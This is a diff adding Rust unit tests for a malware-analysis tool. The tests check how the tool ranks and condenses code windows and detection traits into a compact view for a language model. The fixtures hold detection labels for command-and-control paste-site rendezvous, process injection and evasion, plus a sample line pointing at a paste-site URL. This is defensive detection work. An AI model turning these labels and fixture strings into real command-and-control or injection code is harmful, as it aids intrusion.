+            "objectives/evasion/history::off",
+            Criticality::Suspicious,
+            0.5,
+        )];
+        for (i, fam) in ["net/http", "fs/write", "process/create", "crypto/aes"]
+            .iter()
+            .enumerate()
+        {
+            context.push(story_line(
+                i as u64 + 1,
+                &format!("notable_{i}()\n"),
+                &format!("micro-behaviors/{fam}::n{i}"),
+                Criticality::Notable,
+                0.95,
+            ));
+        }
+        context.sort_by_key(|l| l.loc);
+        let tiny = format_context(
+            &report_with_files(vec![story_file(context, vec![])]),
+            &capped(1),
+        );
+        assert!(
+            tiny.contains("suspicious_call("),
+            "suspicious drawn: {tiny}"
+        );
+        assert!(!tiny.contains("notable_0()"), "no notable window: {tiny}");
+    }
+
+    /// Within one criticality, a window from a family not yet drawn beats a
+    /// slightly more confident one repeating a family already shown.
+    #[test]
+    fn tiny_window_pick_spreads_across_families() {
+        let context = vec![
+            story_line(
+                1,
+                "first_http(a)\n",
+                "micro-behaviors/net/http::a",
+                Criticality::Notable,
+                0.9,
+            ),
+            story_line(
+                2,
+                "again_http(b)\n",
+                "micro-behaviors/net/http::b",
+                Criticality::Notable,
+                0.85,
+            ),
+            story_line(
+                3,
+                "write_file(c)\n",
+                "micro-behaviors/fs/write::c",
+                Criticality::Notable,
+                0.8,
+            ),
+        ];
+        let tiny = format_context(
+            &report_with_files(vec![story_file(context, vec![])]),
+            &capped(2),
+        );
+        assert!(tiny.contains("first_http(a)"), "best window drawn: {tiny}");
+        assert!(tiny.contains("write_file(c)"), "new family drawn: {tiny}");
+        assert!(
+            !tiny.contains("again_http(b)"),
+            "repeat family skipped: {tiny}"
+        );
+        assert!(
+            tiny.contains("micro-behaviors/net/http::b"),
+            "the skipped finding still lists: {tiny}"
+        );
+    }
+
+    /// A withheld composite's leg outranks an equally graded, more confident
+    /// unreferenced note — whether the leg holds its own note or was handed
+    /// the composite's — yet its window carries only the leg's own label.
+    #[test]
+    fn tiny_window_pick_ranks_legs_by_their_withheld_composite() {
+        let leg = "objectives/command-and-control/infrastructure/paste::shz-al";
+        let comp = "objectives/command-and-control/channel/rendezvous::paste";
+        for relabeled in [false, true] {
+            let composite = Finding {
+                trait_refs: vec![leg.to_string().into()],
+                conf: 0.8,
+                ..finding_with(comp, Criticality::Suspicious)
+            };
+            let leg_finding = Finding {
+                conf: 0.7,
+                evidence: vec![Evidence::new("string", "", "shz.al").with_offset(50)],
+                ..finding_with(leg, Criticality::Notable)
+            };
+            let leg_line = if relabeled {
+                story_line(
+                    50,
+                    "PASTE = 'https://shz.al/x'\n",
+                    comp,
+                    Criticality::Suspicious,
+                    0.8,
+                )
+            } else {
+                story_line(
+                    50,
+                    "PASTE = 'https://shz.al/x'\n",
+                    leg,
+                    Criticality::Notable,
+                    0.7,
+                )
+            };
+            let other = story_line(
+                1,
+                "requests.get(url)\n",
+                "micro-behaviors/net/http::get",
+                Criticality::Notable,
+                0.95,
+            );
+            let mut file = story_file(vec![other], vec![leg_finding, composite]);
+            file.context.push(leg_line);
+            let tiny = format_context(&report_with_files(vec![file]), &capped(1));
+            assert!(
+                tiny.contains("shz.al"),
+                "relabeled={relabeled}: leg drawn: {tiny}"
+            );
+            assert!(
+                !tiny.contains("requests.get(url)"),
+                "relabeled={relabeled}: unreferenced note not drawn: {tiny}"
+            );
+            assert!(
+                tiny.contains(&format!("# N 50:1 {leg}")),
+                "relabeled={relabeled}: the leg's own grade and id: {tiny}"
+            );
+            assert!(
+                !tiny.contains("rendezvous") && !tiny.contains("# S ") && !tiny.contains("# H "),
+                "relabeled={relabeled}: no composite id or grade leaks: {tiny}"
+            );
+        }
+    }
+
+    /// An import note no composite draws on earns no window on a budgeted
+    /// file, however confident, and still lists as a location-less note.
+    #[test]
+    fn tiny_window_pick_skips_metadata_only_windows() {
+        let import = "metadata/import/python/subprocess::subprocess";
+        let context = vec![
+            story_line(1, "import subprocess\n", import, Criticality::Notable, 0.95),
+            story_line(
+                10,
+                "requests.get(url)\n",
+                "micro-behaviors/net/http::get",
+                Criticality::Notable,
+                0.5,
+            ),
+            story_line(
+                20,
+                "open(p, 'w')\n",
+                "micro-behaviors/fs/write::open",
+                Criticality::Notable,
+                0.5,
+            ),
+        ];
+        let tiny = format_context(
+            &report_with_files(vec![story_file(context, vec![])]),
+            &capped(2),
+        );
+        assert!(
+            !tiny.contains("import subprocess"),
+            "import not drawn: {tiny}"
+        );
+        assert!(tiny.contains("requests.get(url)"), "behavior drawn: {tiny}");
+        assert!(tiny.contains("open(p, 'w')"), "behavior drawn: {tiny}");
+        assert!(tiny.contains(import), "import still lists: {tiny}");
+    }
+
+    /// Equal candidates across families and tiers render identically run to
+    /// run, whatever order the hash maps iterate in.
+    #[test]
+    fn tiny_window_pick_is_deterministic() {
+        let context: Vec<ContextLine> = (0..40u64)
+            .map(|i| {
+                story_line(
+                    i * 10 + 1,
+                    &format!("call_{i}(arg)\n"),
+                    &format!("micro-behaviors/f{}/g{}::t{i}", i % 5, i % 3),
+                    Criticality::Notable,
+                    0.8,
+                )
+            })
+            .collect();
+        let report = report_with_files(vec![story_file(context, vec![])]);
+        let first = format_context(&report, &capped(7));
+        for _ in 0..20 {
+            assert_eq!(format_context(&report, &capped(7)), first);
+        }
+    }
+
+    /// Composite backing propagates through nested composites: an atom two
+    /// composites deep takes the outer composite's criticality, and each
+    /// composite counts once.
+    #[test]
+    fn withheld_composite_support_propagates_through_nested_composites() {
+        let outer = Finding {
+            trait_refs: vec!["objectives/inner".to_string().into()],
+            ..finding_with("objectives/outer", Criticality::Hostile)
+        };
+        let inner = Finding {
+            trait_refs: vec!["micro/atom".to_string().into()],
+            ..finding_with("objectives/inner", Criticality::Suspicious)
+        };
+        let file = src_file(
+            0,
+            "a.py",
+            50,
+            vec![
+                outer,
+                inner,
+                finding_with("micro/atom", Criticality::Notable),
+            ],
+            vec![],
+        );
+        let got = withheld_composite_support(&file, &HashSet::new());
+        let hostile = Criticality::Hostile.rank();
+        assert_eq!(
+            got.get("micro/atom"),
+            Some(&CompositeSupport {
+                rank: hostile,
+                composites: 2
+            })
+        );
+        assert_eq!(
+            got.get("objectives/inner"),
+            Some(&CompositeSupport {
+                rank: hostile,
+                composites: 1
+            })
+        );
+        assert_eq!(got.get("objectives/outer"), None);
+    }
+
+    #[test]
+    fn trait_family_takes_segments_below_the_namespace() {
+        let id = "objectives/command-and-control/infrastructure/paste::shz-al";
+        assert_eq!(
+            trait_family(id, 2),
+            "objectives/command-and-control/infrastructure"
+        );
+        assert_eq!(
+            trait_family(id, 3),
+            "objectives/command-and-control/infrastructure/paste"
+        );
+        assert_eq!(trait_family("t/one", 3), "t/one");
     }
 
     #[test]
@@ -5496,6 +6281,60 @@ mod tests {
             !output.contains("HIDDEN_COMPONENT"),
             "a capped file keeps default component gating\n{output}"
         );
+    }
+
+    #[test]
+    fn tiny_lists_no_capabilities_for_a_quiet_platform_signed_file() {
+        let runtime_identity = identity(serde_json::json!({
+            "name": {"value": "msvcp140.dll", "source": "pe.version.original_filename"},
+            "organization": {"value": "Microsoft Corporation", "source": "pe.signatures[0]", "verified": true},
+            "trust": "platform"
+        }));
+        let mut runtime = src_file(
+            0,
+            "/pkg.tgz!!bin/msvcp140.dll",
+            30,
+            vec![finding_with(
+                "micro-behaviors/fs/file::position-api",
+                Criticality::Notable,
+            )],
+            vec![],
+        );
+        runtime.identity = Some(runtime_identity.clone());
+        let tiny = format_context(&report_with_files(vec![runtime.clone()]), &TinyOpts::tiny());
+        assert!(
+            tiny.contains("msvcp140.dll"),
+            "the header still names it: {tiny}"
+        );
+        assert!(!tiny.contains("position-api"), "no capability list: {tiny}");
+
+        // Anything suspicious on a signed file is still shown.
+        runtime.findings.push(finding_with(
+            "objectives/evasion/process/injection::remote-thread",
+            Criticality::Suspicious,
+        ));
+        let tiny = format_context(&report_with_files(vec![runtime]), &TinyOpts::tiny());
+        assert!(
+            tiny.contains("remote-thread") || tiny.contains("evasion/process"),
+            "{tiny}"
+        );
+    }
+
+    #[test]
+    fn tiny_gap_lines_name_the_file_not_its_directories() {
+        // The directories above a sample are the operator's filing (`hostile/`,
+        // `benign/`); the LLM view names only the file, like its headers do.
+        let mut file = src_file(0, "/corpus/samples/hostile/x.py", 50, vec![], vec![]);
+        file.analysis_gaps = vec![crate::types::AnalysisGap::FlowGraphLimited].into();
+        let report = report_with_files(vec![file]);
+
+        let tiny = format_context(&report, &TinyOpts::tiny());
+        assert!(tiny.contains("Analysis incomplete for \"x.py\""), "{tiny}");
+        assert!(!tiny.contains("samples/hostile"), "{tiny}");
+
+        // The terminal view keeps the full path for the human who filed it.
+        let term = format_context(&report, &TinyOpts::terminal());
+        assert!(term.contains("/corpus/samples/hostile/x.py"), "{term}");
     }
 
     fn create_test_report(findings: Vec<Finding>, yara_matches: Vec<YaraMatch>) -> AnalysisReport {
